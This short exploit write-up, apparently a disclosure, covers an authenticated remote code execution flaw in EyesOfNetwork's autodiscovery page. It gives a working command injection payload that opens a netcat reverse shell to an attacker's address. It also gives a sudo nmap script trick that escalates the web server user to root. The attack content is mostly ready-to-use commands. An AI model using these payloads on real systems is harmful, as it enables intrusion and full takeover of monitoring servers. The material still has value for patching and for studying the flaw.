#Authentified Romote Code Execution flaw > remote shell > PrivEsc
#
#An user with acces to "/autodiscover.php" can execute remote commande, get a reverse shell and root the targeted machine.

==============================================
Initial RCE

In the webpage : https://EyesOfNetwork_IP/lilac/autodiscovery.php

The "target" input is not controled. It's possible tu put any commands after an "&", RCE is possible with a simple netcat commande like :

& nc -e /bin/sh <IP> <PORT>
==============================================
PrivEsc

The EyesOfNetwork apache user can run "nmap" with sudo privilege and with NOPASSWD attribut, so it's possible to become the root user when using classic PrivEsc methode :

echo 'os.execute("/bin/sh")' > /tmp/nmap.script
sudo nmap --script=/tmp/nmap.script
